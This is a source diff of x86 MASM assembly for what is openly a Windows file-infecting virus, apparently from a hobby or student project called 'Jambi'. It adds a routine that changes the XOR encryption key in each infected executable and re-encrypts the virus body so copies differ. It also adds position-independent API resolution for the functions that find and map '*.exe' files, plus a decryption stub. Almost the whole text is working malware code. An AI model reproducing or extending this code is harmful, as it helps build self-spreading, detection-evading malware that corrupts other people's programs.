@@ -26,7 +26,10 @@ APPLYXORVALUE	macro addrbegin, addrend, value
 	push eax
 
 	mov esi, addrbegin
-	mov ecx, addrend - addrbegin
+
+	mov ecx, addrend
+	sub ecx, addrbegin
+	
 	xor eax, eax
 
 	.WHILE ecx > 0
@@ -40,11 +43,15 @@ APPLYXORVALUE	macro addrbegin, addrend, value
 	.ENDW
 
 	pop eax
-	pop esi
 	pop ecx
+	pop esi
 				endm
 
-
+GETLABELOFFSET	macro labelBegin, labelEnd, dest
+	mov esi, labelEnd
+	sub esi, labelBegin
+	mov dest, esi
+				endm
 
 
 main:
@@ -54,18 +61,38 @@ main:
 crypted_code_begin:
 loadproc	macro dest, hmodule, loadproc, strproc
 	push eax
+	
 	push strproc
 	push hmodule
 	call loadproc
 	mov dest, eax
+	
 	pop eax
+			endm
+loadprocoff macro dest, hmodule, loadproc, delta, delta_offset
+	
+	push eax
+	push ebx
+
+	mov eax, delta
+	add eax, delta_offset
+	push eax
+	push hmodule
+	call loadproc
+	mov dest, eax
+
+	pop ebx
+	pop eax
+
 			endm
 
 movloc	macro	dest, src
 
 	push edi
+
 	mov edi, src
 	mov dest, edi
+	
 	pop edi
 
 		endm
@@ -183,13 +210,53 @@ endfindprocfail:
 	ret
 getExportedProcAddr endp
 
+postMappingOperations proc pointerToInfectionCode:dword
+	local iXorValue:dword
+	local offsetCryptedCode:dword
+	local cryptedCodeBegin:dword
+	local cryptedCodeEnd:dword
+
+	push eax
+	push ebx
+
+	;; First, we change the XOR value so it's (almost) never the same for 2 infected binaries
+	;; We get the offset between our main label and the xor value in our code
+	
+	mov ebx, pointerToInfectionCode
+	mov eax, crypt_key_value
+	sub eax, main						;; eax now holds the offset to crypt_key_value in terms of code
+
+	add ebx, eax						;; ebx now has the address of crypt_key_value in the infected file
+	inc byte ptr[ebx]					;; increment it (value will lose itself when infection propagates)
+	xor eax, eax
+	mov al, byte ptr [ebx]
+	mov iXorValue, eax
+
+	GETLABELOFFSET main, crypted_code_begin, offsetCryptedCode
+	movloc cryptedCodeBegin, pointerToInfectionCode
+	addloc cryptedCodeBegin, offsetCryptedCode
+
+	GETLABELOFFSET main, crypted_code_end, offsetCryptedCode
+	movloc cryptedCodeEnd, pointerToInfectionCode
+	addloc cryptedCodeEnd, offsetCryptedCode
+
+	APPLYXORVALUE cryptedCodeBegin, cryptedCodeEnd, iXorValue
+	;; now, we XOR the part of the file which holds our code, using the new xor key
+
+	
+	pop ebx
+	pop eax
+	ret
+postMappingOperations endp
+
 filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
 	local findFileData:WIN32_FIND_DATA
 	local searchHandle:dword
 	local fileHandle:dword
 	local fileMapping:dword
 	local fileView:dword
-	
+	local localdelta:dword
+
 	local prcFindFirstFile:dword
 	local prcFindNextFile:dword
 	local prcFindClose:dword
@@ -199,21 +266,28 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
 	local prcUnmapViewOfFile:dword
 	local prcCloseHandle:dword
 
-	jmp filesLoopInit
+	;jmp filesLoopInit
+	call filesLoopInit
 
-	PatternStr				db "*.exe",0 ; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
-	strFindFirstFile		db "FindFirstFileA",0
-	strFindNextFile			db "FindNextFileA",0
-	strFindClose			db "FindClose",0
-	strCreateFile			db "CreateFileA",0
-	strCreateFileMapping	db "CreateFileMappingA",0
-	strMapViewOfFile		db "MapViewOfFile",0
-	strUnmapViewOfFile		db "UnmapViewOfFile",0
-	strCloseHandle			db "CloseHandle",0
+	; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
+	PatternStr				db "*.exe",0				; size = 06h, offset = 00h
+	strFindFirstFile		db "FindFirstFileA",0		; size = 0fh, offset = 06h
+	strFindNextFile			db "FindNextFileA",0		; size = 0eh, offset = 15h
+	strFindClose			db "FindClose",0			; size = 0ah,
+	strCreateFile			db "CreateFileA",0			; size = ,
+	strCreateFileMapping	db "CreateFileMappingA",0	; size = ,
+	strMapViewOfFile		db "MapViewOfFile",0		; size = ,
+	strUnmapViewOfFile		db "UnmapViewOfFile",0		; size = ,
+	strCloseHandle			db "CloseHandle",0			; size = ,
 
 filesLoopInit:
 
-	loadproc prcFindFirstFile, k32hmodule, prcGetProcAddr, offset strFindFirstFile
+	mov esi, [esp]
+	mov localdelta, esi
+	;movloc localdelta, [esp]
+
+	loadprocoff prcFindFirstFile, k32hmodule, prcGetProcAddr, localdelta, 06h
+	;;loadproc prcFindFirstFile, k32hmodule, prcGetProcAddr, offset strFindFirstFile
 	loadproc prcFindNextFile, k32hmodule, prcGetProcAddr, offset strFindNextFile
 	loadproc prcFindClose, k32hmodule, prcGetProcAddr, offset strFindClose
 	loadproc prcCreateFile, k32hmodule, prcGetProcAddr, offset strCreateFile
@@ -415,11 +489,9 @@ crypt_key_value:
 	CKV db 0	
 
 start_uncrypt:
-	mov eax, crypt_key_value
+	;mov eax, CKV
 	mov ecx, crypted_code_begin
-	APPLYXORVALUE crypted_code_begin, crypted_code_end, eax
-
-unencrypt_loop:
+	;APPLYXORVALUE crypted_code_begin, crypted_code_end, CKV
 	
 	jmp startinf
 
